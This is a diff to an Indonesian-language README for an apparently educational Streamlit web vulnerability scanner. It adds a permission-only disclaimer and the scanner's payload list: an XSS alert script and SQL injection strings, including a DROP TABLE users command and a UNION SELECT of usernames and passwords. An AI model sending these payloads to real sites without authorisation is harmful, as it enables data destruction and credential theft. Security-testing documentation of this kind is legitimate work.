@@ -38,10 +38,29 @@ pip install -r requirements.txt
 ```bash
 streamlit run app.py
 ```
--Akses aplikasi melalui browser web Anda di [http://localhost:8501]() dan masukkan URL target untuk dipindai.
+- Akses aplikasi melalui browser web Anda di [http://localhost:8501]() dan masukkan URL target untuk dipindai.
 
 ## Disclaimer
-Alat ini ditujukan untuk tujuan pendidikan dan kesadaran saja. Gunakan dengan tanggung jawab dan hanya pada situs web yang Anda miliki izin eksplisit untuk diuji.
+Alat ini ditujukan untuk tujuan pendidikan dan kesadaran saja. Gunakan dengan tanggung jawab dan hanya pada situs web yang Anda miliki izin eksplisit untuk diuji. Berikut adalah payloads sederhana yang digunakan dan bisa diubah/ditambahkan sesuai kebutuhan.
+
+### XSS Payloads
+```bash
+<script>alert('XSS')</script>
+```
+### SQL Injection Payloads
+```bash
+'; DROP TABLE users; --
+'; SELECT * FROM users; --
+' OR '1'='1'; --
+" OR "1"="1"; --
+'; --
+"; --
+--
+#
+';/*
+') OR ('1'='1'); --
+UNION SELECT username, password FROM users; --
+```
 
 ## Lisensi
 Proyek ini dilisensikan di bawah Lisensi [MIT](https://choosealicense.com/licenses/mit/).
